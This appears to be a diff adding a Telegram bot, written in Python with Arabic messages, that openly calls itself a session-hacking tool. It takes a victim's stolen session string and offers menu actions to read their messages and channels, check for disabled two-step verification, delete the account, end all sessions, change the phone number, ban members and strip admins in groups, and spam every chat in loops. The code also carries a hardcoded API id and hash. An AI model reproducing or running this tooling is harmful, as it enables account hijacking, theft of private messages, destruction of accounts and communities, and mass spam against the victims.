+    Button.inline("B", data="B"),
+    Button.inline("C", data="C"),
+    Button.inline("D", data="D"),
+    Button.inline("E", data="E")
+    ],
+  [
+    Button.inline("F", data="F"), 
+    Button.inline("G", data="G"),
+    Button.inline("H", data="H"),
+    Button.inline("I", data="I"),
+    Button.inline("J", data="J"),
+    ],
+  [
+    Button.inline("K", data="K"), 
+    Button.inline("L", data="L"),
+    Button.inline("M", data="M"),
+    Button.inline("N", data="N"),
+    ],
+  [
+    Button.url("المطور", "https://t.me/ELHYBA")
+    ]
+]
+
+@client.on(events.NewMessage(pattern="/start"))
+async def op(event):
+  global mm
+  if not event.is_private:
+    ZeHack = [
+      [
+        Button.url("اضغط هنا عزيزي", f"https://t.me/UPUOBOT?start=hack")
+        ]
+      ]         
+    await event.reply("اضغط بالاسفل لاستخدامي", buttons=ZeHack)
+  else:
+    legendbye = [
+      [
+        Button.url("سورس زد إي", f"https://t.me/Source_Ze")
+        ]
+      ]
+    await event.reply("عليك اولا دخول قناة البوت!\n ثم اضغط هنا ~ /hack", buttons=legendbye)
+    
+       
+@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+async def op(event):
+  ZeHack = [
+    [
+      Button.url("اضغط هنا عزيزي", f"https://t.me/")
+      ]
+    ]         
+  await event.reply("اضغط بالاسفل لاستخدامي", buttons=ZeHack)
+  
+@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
+async def start(event):
+  global menu
+  async with bot.conversation(event.chat_id) as x:
+    keyboard = [
+      [  
+        Button.inline("A", data="A"), 
+        Button.inline("B", data="B"),
+        Button.inline("C", data="C"),
+        Button.inline("D", data="D"),
+        Button.inline("E", data="E")
+        ],
+      [
+        Button.inline("F", data="F"), 
+        Button.inline("G", data="G"),
+        Button.inline("H", data="H"),
+        Button.inline("I", data="I"),
+        Button.inline("J", data="J")
+        ],
+      [
+        Button.inline("K", data="K"), 
+        Button.inline("L", data="L"),
+        Button.inline("M", data="M"),
+        Button.inline("N", data="N"),
+        ],
+      [
+        Button.url("المطور", "https://t.me/ELHYBA")
+        ]
+    ]
+    await x.send_message(f"اختر ما تريد فعله مع الجلسه \n\n{menu}", buttons=keyboard)
+    
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n /hack", buttons=keyboard)
+      try:
+        i = await userchannels(strses.text)
+      except:
+        return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
+      if len(i) > 3855:
+        file = open("session.txt", "w")
+        file.write(i + "\n\nDetails BY @ELHYBA")
+        file.close()
+        await bot.send_file(event.chat_id, "session.txt")
+        system("rm -rf session.txt")
+      else:
+        await event.reply(i + "\n\nشكرا لاستخدامك بوت اختراق الجلسات المقدم من سورس زد إي. ❤️ \n/hack", buttons=keyboard)
+      
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل الكود تيرمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
+    i = await userinfo(strses.text)
+    await event.reply(i + "\n\nشكرا لاستخدامك بوت اختراق الجلسات المقدم من سورس زد إي. ❤\n/hack", buttons=keyboard)
+    
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل الكود تيرمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
+    await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
+    grpid = await x.get_response()
+    await userbans(strses.text, grpid.text)
+    await event.reply("يتم حظر جميع اعضاء القناة/الكروب. شكرا لاستخدامك سورس زد إي. ❤", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await usermsgs(strses.text)
+      await event.reply(i + "\n\nشكرا لاستخدامك سورس زد إي. ❤", buttons=keyboard)
+    
+      
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل الكود تيرمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+    await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
+    grpid = await x.get_response()
+    await joingroup(strses.text, grpid.text)
+    await event.reply("تم الانضمام الي القناة او الكروب. شكرا لاستخدامك سورس زد إي. ❤", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل الكود تيرمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+    await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
+    grpid = await x.get_response()
+    await leavegroup(strses.text, grpid.text)
+    await event.reply("تم مغادرة القناه او الكروب. شكرا لاستخدامك سورس زد إي. ❤,", buttons=keyboard)
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
+      grpid = await x.get_response()
+      await delgroup(strses.text, grpid.text)
+      await event.reply("تم حذف القناه او الكروب. شكرا لاستخدامك سورس زد إي. ❤.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await user2fa(strses.text)
+      if i:
+        await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D )\n\nشكرا لاستخدامك بوت اختراق الجلسات المقدم من سورس زد إي. ❤", buttons=keyboard)
+      else:
+        await event.reply("للاسف الشخص مفعل التحقق بخطوتين", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await terminate(strses.text)
+      await event.reply("تم انهاء جميع الجلسات\n\nشكرا لاستخدامك سورس زد إي. ❤.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await delacc(strses.text)
+      await event.reply("تم حذف الحساب بنجاح.\n\nشكرا لاستخدامك بوت اختراق الجلسات المقدم من سورس زد إي. ❤", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
+      grp = await x.get_response()
+      await x.send_message("ارسل لي المعرف")
+      user = await x.get_response()
+      i = await promote(strses.text, grp.text, user.text)
+      await event.reply("سارفعك في القناه / الكروب 😗😗\n\nشكرا لاستخدامك بوت اختراق الجلسات المقدم من سورس زد إي. ❤", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
+      pro = await x.get_response()
+      try:
+        i = await demall(strses.text, pro.text)
+      except:
+        pass
+      await event.reply("تم حذف جميع مشرفين الكروب/القناة. 😗😗\n\nشكرا لاستخدامك سورس زد إي. ❤.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("اعطني رقم التي تريد تغير اليه\n[ملاحظه /لا تستخدم ارقام الوهميه]\n[اذا استخدمت الارقام الوهميه مراح تكدر تحصل الكود] ")
+      number = (await x.get_response()).text
+      try:
+        result = await change_number(strses.text, number)
+        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await asyncio.sleep(20)
+        await x.send_message("الان ارسل لي الهاش")
+        phone_code_hash = (await x.get_response()).text
+        await x.send_message("الان ارسل لي الكود")
+        otp = (await x.get_response()).text
+        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
+        if changing:
+          await event.respond("تم تغيير الرقم بنجاح")
+        else:
+          await event.respond("هناك خطا ما حصل")
+      except Exception as e:
+        await event.respond("ارسل الخطا الي - @ELHYBA\n**LOGS**\n" + str(e))
+
+
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
+async def start(event):
+    keyboard = [
+      [  
+        Button.inline("a", data="a"), 
+        Button.inline("b", data="b"),
+        Button.inline("c", data="c"),
+        ],
+      [
+        Button.url("المطور", "https://t.me/ELHYBA")
+        ]
+    ]
+    await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
+
+
+
+async def gcasta(strses, msg):
+    async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for aman in X.iter_dialogs():
+                chat = aman.id
+                try:
+                    await X.send_message(chat, tol, file=file)     
+                    if lol != -1001551357238:
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                    elif chat == -1001606996743:
+                        pass
+                    await asyncio.sleep()
+                except Exception as e:
+                    print(e)
+        except Exception as e:
+            print(e)        
+
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرسالة")
+      msg = await x.get_response()
+      await x.send_message("الان سيتم ارسال الرسالة بشكل تلقائي كل 10 دقائق. ")
+      i = await gcasta(strses.text, msg.text)
+      await event.reply(f"تم النشر {i} في كل المحادثات 😗😗\n\nشكرا لاستخدامك بوت اختراق الجلسات المقدم من سورس زد إي. ❤", buttons=keyboard)
+
+molb = True
+
+async def gcastb(strses, msg):
+    async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for sweetie in X.iter_dialogs():
+                if sweetie.is_group:
+                    chat = sweetie.id
+                    try:
+                        if chat != -1001606996743:
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(600)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(600)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            while molb != False:
+                                await asyncio.sleep(600)
+                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
+                        elif chat == -1001606996743:
+                            pass
+                    except Exception as e:
+                        print(e)
+        except Exception as e:
+            print(e)
+
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرسالة")
+      msg = await x.get_response()
+      await x.send_message("الان سيتم ارسال الرسالة بشكل تلقائي كل 10 دقائق. ")
+      i = await gcastb(strses.text, msg.text)
+      await event.reply(f"تم النشر في {i} جروب 😗😗\n\nشكرا لاستخدامك بوت اختراق الجلسات المقدم من سورس زد إي. ❤", buttons=keyboard)
+
+async def gcastc(strses, msg):
+    async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for krishna in X.iter_dialogs():
+                if krishna.is_user and not krishna.entity.bot:
+                    chat = krishna.id
+                    try:
+                        await X.send_message(chat, tol, file=file)
+                        while molc != False:
+                            await asyncio.sleep(10)
+                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
+                    except BaseException:
+                        pass
+        except Exception as e:
+            print(e)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرسالة")
+      msg = await x.get_response()
+      await x.send_message("الان سيتم ارسال الرسالة بشكل تلقائي كل 10 دقائق. ")
+      i = await gcastc(strses.text, msg.text)
+      await event.reply(f"محادثات خاصة {i} تم النشر في  😉😉.\n\nشكرا لاستخدامك بوت اختراق الجلسات المقدم من سورس زد إي. ❤", buttons=keyboard)
+
+print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @Source_Ze|ZeSupport")
+client.run_until_disconnected()
